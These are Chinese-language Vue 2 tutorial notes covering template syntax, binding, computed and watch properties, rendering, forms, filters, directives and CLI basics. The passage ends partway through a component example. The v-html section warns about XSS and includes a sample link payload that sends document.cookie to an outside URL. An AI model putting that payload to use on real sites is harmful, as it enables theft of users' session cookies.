- [1.vue基础](#1vue基础)
  - [1.1 模板语法](#11-模板语法)
  - [1.2 数据绑定](#12-数据绑定)
  - [1.3 el与data的两种写法](#13-el与data的两种写法)
  - [1.4 数据代理](#14-数据代理)
    - [defineProperty](#defineproperty)
    - [getOwnPropertyDescriptor](#getownpropertydescriptor)
    - [Vue中的数据代理](#vue中的数据代理)
  - [1.5 事件处理](#15-事件处理)
    - [事件修饰符](#事件修饰符)
    - [键盘事件](#键盘事件)
  - [1.6 计算属性](#16-计算属性)
  - [1.7 监视属性](#17-监视属性)
  - [1.8 绑定样式](#18-绑定样式)
    - [class样式](#class样式)
    - [style样式](#style样式)
  - [条件渲染](#条件渲染)
    - [v-if](#v-if)
    - [v-show](#v-show)
  - [1.9 列表渲染](#19-列表渲染)
    - [v-for指令](#v-for指令)
  - [1.14 vm 检测data数据](#114-vm-检测data数据)
  - [1.10 收集表单数据](#110-收集表单数据)
  - [1.11 注册过滤器](#111-注册过滤器)
  - [1.12 内置指令](#112-内置指令)
  - [1.18 自定义指令](#118-自定义指令)
- [2. vue脚手架](#2-vue脚手架)
  - [2.1 脚手架](#21-脚手架)
    - [修改脚手架的默认配置](#修改脚手架的默认配置)
  - [2.2 基础知识](#22-基础知识)
    - [2.2.1 ref属性](#221-ref属性)
    - [2.2.2 props配置项](#222-props配置项)
    - [2.2.3 mixin(混入)](#223-mixin混入)
    - [2.2.4 插件](#224-插件)
    - [2.2.5 scoped样式](#225-scoped样式)

# 1.vue基础

## 1.1 模板语法

Vue模板语法有2大类:

- 插值语法：
  功能：用于解析标签体内容
  写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性

    ```html
    <h1>{{name.toUpperCase()}},{{address}} {{1+1}} {{Date.now()}}</h1>
    ```

- 指令语法:
  功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）
  举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，且可以直接读取到data中的所有属性

    ```html
    <!--v-bind绑定指令，就把下面的url当成一个js表达式去执行了-->
       <a v-bind:href="url.toUpperCase()" v-bind:x="x">百度一下</a>
       <!-- v-bind: 还可以简写为: -->
       <a :href="url_taiwan" :x="x">google 台湾</a>
    ```

## 1.2 数据绑定

Vue中有2种数据绑定的方式：

- 单向绑定(v-bind)：数据只能从data流向页面
- 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data

  > 注意:
  > 1.双向绑定一般都应用在表单类元素上（如：input、select等）
  > 2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值

## 1.3 el与data的两种写法

el有2种写法

- new Vue时候配置el属性
- 先创建Vue实例，随后再通过vm.$mount('#root')指定el的值

```html
<script>
    // 第一种 
 const vm = new Vue({
  el:'#root',
  data:{
   name:'jack',
        }
 })
    
    // 第二种
    vm.$mount('#root')
</script>
```

data有2种写法

- 对象式
- 函数式

  > 在组件中，data必须使用函数式
>
```html
<script>
    new Vue({
  el:'#root',
        // 第一种
  data:{
   name:'jack',
        }
        
        // 第二种
        data() {
         return {
                name: 'jack'
            }
     }
 })
</script>
```

## 1.4 数据代理

### defineProperty

`Object.defineProperties(obj, props)`
作用：在对象上定义多个新的属性或者修改多个原有属性

props：
[[configurable]]:表示属性是否可以被delete，以及其他3个属性描述符的值是否可以被修改，甚至改写成访问器属性(Vue的ObServer就是这样进行数据劫持的)
[[enumerable]]:是否可枚举，是否能通过for in 循环返回该属性
[[writable]]: 是否可修改
[[value]]:属性的数据值，默认是undefined

```html
<script type="text/javascript">
       let number = 18;
       let person = {
           name: '张三',
           sex:'男'
       }

       Object.defineProperty(person,'age', {
           // value: 18,
           // enumerable: true, //此时代表这个属性是可以枚举的
           // writable: true, //代表可以重写该属性(控制属性是否被修改)
           // configurable:true, //控制属性是否可以被删除 默认为false


           //当读取person的age属性时get属性就会被调用，且返回值就是age的值
           //invoke property proxy映射数据代理
           get: function () {
               //测试它的调用情况
               console.log('@@@ GET AGE');
               //此时age的值依赖number的值
               return number
           },
           //当修改person的age属性时set(setter)属性就会被调用，且会收到修改的具体值
           set(v) {
               //测试
               console.log('CHANGE AGE');
               number=v;
           }
       });

       // console.log(Object.keys(person))

       //遍历
       // for(var p  in  person){
       //     console.log('@@', person[p])
       // }
   </script>
```

### getOwnPropertyDescriptor

```js
let user = {
  name: "John"
};

let descriptor = Object.getOwnPropertyDescriptor(user, 'name');


console.log(descriptor)

/* 属性描述符：
{
  "value": "John",
  "writable": true,
  "enumerable": true,
  "configurable": true
}
*/
```

### Vue中的数据代理

- Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）
- Vue中数据代理的好处：更加方便的操作data中的数据
- 基本原理：
  - 通过Object.defineProperty()把data对象中所有属性添加到vm上。
  - 为每一个添加到vm上的属性，都指定一个getter/setter。
  - 在getter/setter内部去操作（读/写）data中对应的属性。

## 1.5 事件处理

事件的基本使用：

- 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名
- 事件的回调需要配置在methods对象中，最终会在vm上
- methods中配置的函数，都是被Vue所管理的函数，this的指向是vm或组件实例对象

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <!-- <button v-on:click="showInfo">点我提示信息</button> -->
    <button @click="showInfo1">点我提示信息1（不传参）</button>
    <!-- 主动传事件本身 $event是事件对象，要加上-->
    <button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
</div>

<script>
 const vm = new Vue({
        el:'#root',
        data:{
            name:'vue',
        },
        methods:{
            // 如果vue模板没有写event，会自动传 event 给函数
            showInfo1(event){
                // console.log(event.target.innerText)
                // console.log(this) //此处的this是vm
                alert('同学你好！')
            },
            showInfo2(event,number){
                console.log(event,number)
                // console.log(event.target.innerText)
                // console.log(this) //此处的this是vm
                alert('同学你好！！')
            }
        }
 });
</script>
````

### 事件修饰符

- prevent：阻止默认事件
- stop：阻止事件冒泡
- once：事件只触发一次
- capture：使用事件的捕获模式
- self：只有event.target是当前操作的元素时才触发事件
- passive：事件的默认行为立即执行，无需等待事件回调执行完毕

```html
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>修饰符</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <style>
        *{
            margin: 20px;
        }
        .demo1{
            height: 100px;
            background: deepskyblue;
        }
        .box1{
            padding: 5px;
            background: deepskyblue;
        }
        .box2 {
            padding: 5px;
            background: orange;
        }
        .list{
            width:200px;
            height: 200px;
            background: salmon;
            overflow: auto;
        }
        .list li{
            height: 100px;
        }
    </style>
</head>
<body>
         <!--
				Vue中的事件修饰符：
						1.prevent：阻止默认事件（常用）；
						2.stop：阻止事件冒泡（常用）；
						3.once：事件只触发一次（常用）；
						4.capture：使用事件的捕获模式；
						5.self：只有event.target是当前操作的元素时才触发事件；
						6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
		-->
   <div id="root">
       <h1>欢迎来到 {{ name }}</h1>
       <!--阻止默认事件（常用-->
       <a href="https://www.baidu.com" @click.prevent="showInfo" >点我提示信息</a>
       <!--阻止事件冒泡（常用）-->
       <div class="demo1" @click="showInfo">
           <button @click.stop="showInfo">点我提示信息</button>
           <!--修饰符也可以连用，例如下面事例是即阻止冒泡同时也阻止默认行为-->
           <!--<a href="https://www.google.com.tw" @click.prevent.stop="showInfo">谷歌台湾</a>-->
       </div>
       <!--事件只触发一次-->
       <button @click.once="showInfo">点我提示信息,只在第一次点击生效</button>
       <!-- capture事件的捕获模式 让事件以捕获的方式来处理(先捕获再冒泡)-->
       <div class="box1" @click.capture="showMsg(1)">
           div1
           <div class="box2" @click="showMsg(2)">div2</div>
       </div>
       <!-- self 只有event.target是当前操作的元素时才触发事件(变相阻止冒泡)-->
       <div class="demo1" @click.self="showInfo">
           <button @click="showInfo">点我提示信息</button>
       </div>
       <!--passive：事件的默认行为立即执行，无需等待事件回调执行完毕；-->
       <!--scroll滚动条一滚动就会触发的事件 wheel鼠标滚轮事件-->
       <ul class="list" @scroll.passive="demo">
           <li>1</li>
           <li>2</li>
           <li>3</li>
           <li>4</li>
       </ul>
   </div>
   <script type='text/javascript'>
       Vue.config.productionTip = false;
       new Vue({
           el: "#root",
           data(){
               return {
                   name: 'Shanghai'
               }
           },
           methods:{
               showInfo(e){
                   // e.preventDefault(); 阻止a标签默认行为
                   // e.stopPropagation() //阻止事件冒泡
                   // alert('你好');
                   console.log(e.target);
               },
               showMsg(msg){
                   console.log(msg);
               },
               demo(){
                   // console.log(`@`)
                   // for(let i = 0; i < 100000; i++){
                   //     console.log('#')
                   // }
                   // console.log('累了')
               }
           }
       });
   </script>
</body>
</html>
```

### 键盘事件

键盘事件语法糖：@keydown，@keyup

Vue中常用的按键别名：

- 回车 => enter
- 删除 => delete
- 退出 => esc
- 空格 => space
- 换行 => tab (特殊，必须配合keydown去使用)

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo">
</div>

<script>
    new Vue({
        el:'#root',
        data:{
            name:'浙江理工大学'
        },
        methods: {
            showInfo(e){
                // console.log(e.key,e.keyCode)
                console.log(e.target.value)
            }
        },
    })
</script>
```

## 1.6 计算属性

- 定义：要用的属性不存在，要通过已有属性计算得来
- 原理：底层借助了Objcet.defineProperty方法提供的getter和setter
- get函数什么时候执行？
  - (1).初次读取时会执行一次
  - (2).当依赖的数据发生改变时会被再次调用
- 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便
- 备注：
  - 计算属性最终会出现在vm上，直接读取使用即可
  - 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变

```html
<!-- 准备好一个容器-->
<div id="root">
    姓：<input type="text" v-model="firstName">
    名：<input type="text" v-model="lastName"> 
    全名：<span>{{fullName}}</span>
</div>

<script>
 const vm = new Vue({
        el:'#root',
        data:{
            firstName:'张',
            lastName:'三',
        }
        computed:{
            fullName:{
                get(){
                    console.log('get被调用了')
                    return this.firstName + '-' + this.lastName
                },

                set(value){
                    console.log('set',value)
                    const arr = value.split('-')
                    this.firstName = arr[0]
                    this.lastName = arr[1]
                }
            }
            // 如果只需要get属性，可以简写成下面
            // computed:{
            //   fullName() {
            //       console.log('get被调用了')
            //       return this.firstName + '-' + this.lastName
            //       }
            //     }
        }
        // methods 方法实现
        // methods:{
        //        fullName(){
        //            return `${this.firstName.slice(0,3)} -- ${this.lastName}`
        //        }
        //    }
    })
</script>
```

## 1.7 监视属性

监视属性watch：

- 当被监视的属性变化时, 回调函数自动调用, 进行相关操作
- 监视的属性必须存在，才能进行监视
- 监视的两种写法：
  - (1).new Vue时传入watch配置
  - (2).通过vm.$watch监视

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>今天天气很{{ info }}</h2>
    <button @click="changeWeather">切换天气</button>
</div>


<script>
 const vm = new Vue({
        el:'#root',
        data:{
            isHot:true,
        },
        computed:{
            info(){
                return this.isHot ? '炎热' : '凉爽'
            }
        },
        methods: {
            changeWeather(){
                this.isHot = !this.isHot
            }
        },
        watch:{
            isHot:{
                immediate: true, // 初始化时让handler调用一下
                // handler什么时候调用？当isHot发生改变时。
                handler(newValue, oldValue){
                    console.log('isHot被修改了',newValue,oldValue)
                }
            }

            // 简写
            // isHot(newValue, oldValue) {
            // console.log('isHot被修改了', newValue, oldValue, this)
            // } 
        } 
    }

    //  第三种写法
    // vm.$watch('isHot',{
    //     immediate:true, //初始化时让handler调用一下
    //     //handler什么时候调用？当isHot发生改变时。
        
    //     handler(newValue,oldValue){
    //         console.log('isHot被修改了',newValue,oldValue)
    //     }}
    
    
    )
</script>
```

**深度监视：**

- Vue中的watch默认不监测对象内部值的改变（一层）
- 配置deep:true可以监测对象内部值改变（多层）

computed和watch之间的区别：

- computed能完成的功能，watch都可以完成
- watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作

> 两个重要的小原则：
> 1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象
> 2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象

## 1.8 绑定样式

### class样式

写法：`:class="xxx"`   xxx可以是字符串、对象、数。

所以分为三种写法，字符串写法，数组写法，对象写法

字符串写法

字符串写法适用于：类名不确定，要动态获取。

```html
<style>
 .normal{
        background-color: skyblue;
    }
</style>

<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
    <div class="basic" :class="mood" @click="changeMood">{{name}}</div>
</div>

<script>
 const vm = new Vue({
        el:'#root',
        data:{
            mood:'normal'
        }
    })
</script>
```

数组写法

数组写法适用于：要绑定多个样式，个数不确定，名字也不确定。

```html
<style>
    .atguigu1{
        background-color: yellowgreen;
    }
    .atguigu2{
        font-size: 30px;
        text-shadow:2px 2px 10px red;
    }
    .atguigu3{
        border-radius: 20px;
    }
</style>

<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
 <div class="basic" :class="classArr">{{name}}</div>
</div>

<script>
 const vm = new Vue({
        el:'#root',
        data:{
            classArr: ['atguigu1','atguigu2','atguigu3']
        }
    })
</script>
```

对象写法*

对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。

```html
<style>
    .atguigu1{
        background-color: yellowgreen;
    }
    .atguigu2{
        font-size: 30px;
        text-shadow:2px 2px 10px red;
    }
</style>

<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
 <div class="basic" :class="classObj">{{name}}</div>
</div>

<script>
 const vm = new Vue({
        el:'#root',
        data:{
            classObj:{
                atguigu1:false,
                atguigu2:false,
   }
        }
    })
</script>
```

### style样式

有两种写法，对象写法，数组写法

对象写法

```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定style样式--对象写法 -->
 <div class="basic" :style="styleObj">{{name}}</div>
</div>

<script>
 const vm = new Vue({
        el:'#root',
        data:{
            styleObj:{
                fontSize: '40px',
                color:'red',
   }
        }
    })
</script>
```

数组写法

```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定style样式--数组写法 -->
 <div class="basic" :style="styleArr">{{name}}</div>
</div>

<script>
 const vm = new Vue({
        el:'#root',
        data:{
            styleArr:[
                {
                    fontSize: '40px',
                    color:'blue',
                },
                {
                    backgroundColor:'gray'
                }
            ]
        }
    })
</script>
```

## 条件渲染

### v-if

- 写法：

  1. v-if="表达式"
  2. v-else-if="表达式"
  3. v-else="表达式"

- 适用于：切换频率较低的场景
- 特点：不展示的DOM元素直接被移除
- 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”

```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 使用v-if做条件渲染 -->
    <h2 v-if="false">欢迎来到{{name}}</h2>
    <h2 v-if="1 === 1">欢迎来到{{name}}</h2>
    
    
    <!-- v-else和v-else-if -->
    <div v-if="n === 1">Angular</div>
    <div v-else-if="n === 2">React</div>
    <div v-else-if="n === 3">Vue</div>
    <div v-else>哈哈</div>
    
    
    <!-- v-if与template的配合使用 -->
    <!-- 就不需要写好多个判断，写一个就行 -->
    <!-- 这里的思想就像事件代理的使用 -->
    <template v-if="n === 1">
        <h2>你好</h2>
        <h2>123</h2>
        <h2>北京</h2>
    </template>
</div>

<script>
 const vm = new Vue({
        el:'#root',
        data:{
            styleArr:[
                {
                    fontSize: '40px',
                    color:'blue',
                },
                {
                    backgroundColor:'gray'
                }
            ]
        }
    })
</script>
```

### v-show

- 写法：v-show="表达式"
- 适用于：切换频率较高的场景
- 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉(display:none)

> 备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到
> v-if 是实打实地改变dom元素，v-show 是隐藏或显示dom元素

```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 使用v-show做条件渲染 -->
    <h2 v-show="false">欢迎来到{{name}}</h2>
    <h2 v-show="1 === 1">欢迎来到{{name}}</h2>
</div>
```

## 1.9 列表渲染

### v-for指令

- 用于展示列表数据
- 语法：v-for="(item, index) in xxx" :key="yyy"
- 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

```html
<div id="root">
    <!-- 遍历数组 -->
    <h2>人员列表（遍历数组）</h2>
    <ul>
        <li v-for="(p,index) of persons" :key="index">
            {{p.name}}-{{p.age}}
        </li>
    </ul>

    <!-- 遍历对象 -->
    <h2>汽车信息（遍历对象）</h2>
    <ul>
        <li v-for="(value,k) of car" :key="k">
            {{k}}-{{value}}
        </li>
    </ul>

    <!-- 遍历字符串 -->
    <h2>测试遍历字符串（用得少）</h2>
    <ul>
        <li v-for="(char,index) of str" :key="index">
            {{char}}-{{index}}
        </li>
    </ul>

    <!-- 遍历指定次数 -->
    <h2>测试遍历指定次数（用得少）</h2>
    <ul>
        <li v-for="(number,index) of 5" :key="index">
            {{index}}-{{number}}
        </li>
    </ul>
</div>

<script>
 const vm = new Vue({
        el:'#root',
        data: {
   persons: [
    { id: '001', name: '张三', age: 18 },
    { id: '002', name: '李四', age: 19 },
    { id: '003', name: '王五', age: 20 }
   ],
   car: {
    name: '奥迪A8',
    price: '70万',
    color: '黑色'
   },
   str: 'hello'
  }
    })
</script>
```

注意：

- 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值
- 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的

## 1.14 vm 检测data数据

Vue监视数据的原理：

- vue会监视data中所有层次的数据

- 如何监测对象中的数据？

  通过setter实现监视，且要在new Vue时就传入要监测的数据。

  - 对象中后追加的属性，Vue默认不做响应式处理

  - 如需给后添加的属性做响应式，请使用如下API：

    Vue.set(target，propertyName/index，value) 或

    vm.$set(target，propertyName/index，value)

- 如何监测数组中的数据？

  通过包裹数组更新元素的方法实现，本质就是做了两件事：

  - 调用原生对应的方法对数组进行更新
  - 重新解析模板，进而更新页面

- 在Vue修改数组中的某个元素一定要用如下方法：

  - 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
  - Vue.set() 或 vm.$set()

> 特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！

## 1.10 收集表单数据

若：`<input type="text"/>`，则v-model收集的是value值，用户输入的就是value值。

```html
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
        密码：<input type="password" v-model="userInfo.password"> <br/><br/>
        年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
        <button>提交</button>
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                account:'',
                password:'',
                age:18,
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```

若：`<input type="radio"/>`，则v-model收集的是value值，且要给标签配置value值。

```html
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        性别：
        男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
        女<input type="radio" name="sex" v-model="userInfo.sex" value="female">
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                sex:'female'
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```

若：`<input type="checkbox"/>`

- 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
- 配置input的value属性:
  - v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
  - v-model的初始值是数组，那么收集的的就是value组成的数组

```html
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        爱好：
        学习<input type="checkbox" v-model="userInfo.hobby" value="study">
        打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
        吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
        <br/><br/>
        所属校区
        <select v-model="userInfo.city">
            <option value="">请选择校区</option>
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
            <option value="shenzhen">深圳</option>
            <option value="wuhan">武汉</option>
        </select>
        <br/><br/>
        其他信息：
        <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
        <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
        <button>提交</button>
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                hobby:[],
                city:'beijing',
                other:'',
                agree:''
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```

> 备注：v-model的三个修饰符：
> lazy：失去焦点再收集数据
> number：输入字符串转为有效的数字
> trim：输入首尾空格过滤

## 1.11 注册过滤器

定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。

**语法：**

- 注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
- 使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>显示格式化后的时间</h2>
    <!-- 计算属性实现 -->
    <h3>现在是：{{ fmtTime }}</h3>
    <!-- methods实现 -->
    <h3>现在是：{{ getFmtTime() }}</h3>
    <!-- 过滤器实现 -->
    <h3>现在是：{{time | timeFormater}}</h3>
    <!-- 过滤器实现（传参） -->
    <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
    <h3 :x="msg | mySlice">尚硅谷</h3>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false
    //全局过滤器
    Vue.filter('mySlice',function(value){
        return value.slice(0,4)
    })

    new Vue({
        el:'#root',
        data:{
            time:1621561377603, //时间戳
            msg:'你好，'
        },
        computed: {
            fmtTime(){
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        methods: {
            getFmtTime(){
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        //局部过滤器
        filters:{
            timeFormater(value, str='YYYY年MM月DD日 HH:mm:ss'){
                // console.log('@',value)
                return dayjs(value).format(str)
            }
        }
    })
</script>
```

> 备注：
>
> 1. 过滤器也可以接收额外参数、多个过滤器也可以串联
> 2. 并没有改变原本的数据, 是产生新的对应的数据

## 1.12 内置指令

**v-text指令：**(使用的比较少)

1.作用：向其所在的节点中渲染文本内容。

2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

```html
<!-- 准备好一个容器-->
<div id="root">
    <div>你好，{{name}}</div>
    <div v-text="name"></div>
    <div v-text="str"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'张三',
            str:'<h3>你好啊！</h3>'
        }
    })
</script>
```

**v-html指令：**(使用的很少)

1.作用：向指定节点中渲染包含html结构的内容。

2.与插值语法的区别：

- v-html会替换掉节点中所有的内容，{{xx}}则不会。
- v-html可以识别html结构。

3.严重注意：v-html有安全性问题！！！！

- 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
- 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```js
<!-- 准备好一个容器-->
<div id="root">
    <div>你好，{{name}}</div>
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'张三',
            str:'<h3>你好啊！</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
        }
    })
</script>
```

**v-cloak指令（没有值）：**

- 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
- 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```html
<style>
    [v-cloak]{
        display:none;
    }
</style>
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-cloak>{{name}}</h2>
</div>
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>

<script type="text/javascript">
    console.log(1)
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷'
        }
    })
</script>
```

**v-once指令：**(用的少)

- v-once所在节点在初次动态渲染后，就视为静态内容了。
- 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-once>初始化的n值是:{{ n }}</h2>
    <h2>当前的n值是:{{ n }}</h2>
    <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```

**v-pre指令：**(比较没用)

- 跳过其所在节点的编译过程
- 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-pre>Vue其实很简单</h2>
    <h2 >当前的n值是:{{n}}</h2>
    <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```

## 1.18 自定义指令

需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。

需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。

配置对象中常用的3个回调：

- bind：指令与元素成功绑定时调用。
- inserted：指令所在元素被插入页面时调用。
- update：指令所在模板结构被重新解析时调用。

element:dom元素
binding:绑定值的对象

定义全局指令

```html
<!-- 准备好一个容器-->
<div id="root">
    <input type="text" v-fbind:value="n">
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    //定义全局指令
    Vue.directive('fbind', {
        // 指令与元素成功绑定时（一上来）
        bind(element, binding){
            element.value = binding.value
        },
        // 指令所在元素被插入页面时
        inserted(element, binding){
            element.focus()
        },
        // 指令所在的模板被重新解析时
        update(element, binding){
            element.value = binding.value
        }
    })
    
    new Vue({
        el:'#root',
        data:{
            name: '尚硅谷',
            n: 1
        }
    })

</script>
```

局部指令：

```js
new Vue({
    el: '#root',
    data: {
        name:'sgg',
        n:1
    },
    directives: {
        // big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
        /* 'big-number'(element,binding){
     // console.log('big')
     element.innerText = binding.value * 10
    }, */
        big (element,binding){
            console.log('big',this) //注意此处的this是window
            // console.log('big')
            element.innerText = binding.value * 10
        },
        fbind: {
            //指令与元素成功绑定时（一上来）
            bind (element,binding){
                element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted (element,binding){
                element.focus()
            },
            //指令所在的模板被重新解析时
            update (element,binding){
                element.value = binding.value
            }
        }
    }
})
```

# 2. vue脚手架

## 2.1 脚手架

使用前置：

第一步(没有安装过的执行)：全局安装 @vue/cli

npm install -g @vue/cli

第二步：切换到要创建项目的目录，然后使用命令创建项目

vue create xxxxx

第三步：启动项目

npm run serve

### 修改脚手架的默认配置

- `使用vue inspect > output.js`可以查看到Vue脚手架的默认配置。
- 使用vue.config.js可以对脚手架进行个性化定制，详情见：<https://cli.vuejs.org/zh>

## 2.2 基础知识

### 2.2.1 ref属性

- 被用来给元素或子组件注册引用信息（id的替代者）
- 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
- 使用方式：
  - 打标识：```<h1 ref="xxx">.....</h1>```或 ```<School ref="xxx"></School>```
  - 获取：```this.$refs.xxx```

> 具体案例

```html
<template>
 <div>
  <h1 v-text="msg" ref="title"></h1>
  <button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
  <School ref="sch"/>
 </div>
</template>

<script>
 //引入School组件
 import School from './components/School'

 export default {
  name:'App',
  components:{School},
  data() {
   return {
    msg:'欢迎学习Vue！'
   }
  },
  methods: {
   showDOM(){
    console.log(this.$refs.title) //真实DOM元素
    console.log(this.$refs.btn) //真实DOM元素
    console.log(this.$refs.sch) //School组件的实例对象（vc）
   }
  },
 }
</script>

```

### 2.2.2 props配置项

1. 功能：让组件接收外部传过来的数据

2. 传递数据：```<Demo name="xxx"/>```

3. 接收数据：

   1. 第一种方式（只接收）：```props:['name']```

   2. 第二种方式（限制类型）：```props:{name:String}```

   3. 第三种方式（限制类型、限制必要性、指定默认值）：

      ```js
      props:{
       name:{
              type:String, //类型
              required:true, //必要性
              default:'老王' //默认值
       }
      }
      ```

   > 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。

示例代码：

父组件给子组件传数据

App.vue

```html
<template>
  <div id="app">
    <img alt="Vue logo" src="./assets/logo.png">
    <Student></Student>
    <School name="haha" :age="this.age"></School>
  </div>
</template>

<script>
import School from './components/School.vue'
import Student from './components/Student.vue'

export default {
  name: 'App',
  data () {
    return {
      age: 360  
    }
  },
  components: {
    School,
    Student
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>

```

School.vue

```html
<template>
  <div class="demo">
